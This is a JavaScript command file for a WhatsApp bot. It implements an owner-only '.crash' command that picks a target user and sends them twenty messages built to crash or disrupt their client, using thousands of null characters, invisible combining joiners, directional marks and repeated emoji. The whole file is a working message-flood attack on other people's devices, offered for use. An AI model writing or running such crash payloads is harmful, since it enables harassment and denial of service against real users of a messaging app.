const settings = require('../settings');

function onlyDigits(s = '') { return String(s).replace(/\D/g, ''); }

module.exports = async function(sock, chatId, msg, isOwner, q) {
    if (!isOwner) return await sock.sendMessage(chatId, { text: '\u274C Owner only!' }, { quoted: msg });
    
    try {
        let target;
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;
        
        if (q) target = q.replace(/\D/g, '') + '@s.whatsapp.net';
        else if (mentioned) target = mentioned;
        else if (quoted) target = quoted;
        else return await sock.sendMessage(chatId, { text: '\u26A0\uFE0F .crash @user or reply to user' }, { quoted: msg });
        
        await sock.sendMessage(chatId, { text: `\u1F4A5 Sending crash payload to @${target.split('@')[0]}...`, mentions: [target] }, { quoted: msg });
        
        // Send various message types that can cause client issues
        const payloads = [
            '\uD83D\uDC80\uD83D\uDC80\uD83D\uDC80 CRASH PAYLOAD \uD83D\uDC80\uD83D\uDC80\uD83D\uDC80\n'.repeat(100),
            '\u0000'.repeat(5000),
            '\u034F'.repeat(10000),
            '\u200E'.repeat(5000) + '\u200F'.repeat(5000),
        ];
        
        for (let i = 0; i < 20; i++) {
            try {
                await sock.sendMessage(target, { text: payloads[i % payloads.length] });
            } catch (e) {}
        }
        
        await sock.sendMessage(chatId, { text: `\u2705 Crash payload delivered!` }, { quoted: msg });
    } catch (e) {
        await sock.sendMessage(chatId, { text: '\u274C Error: ' + e.message }, { quoted: msg });
    }
};
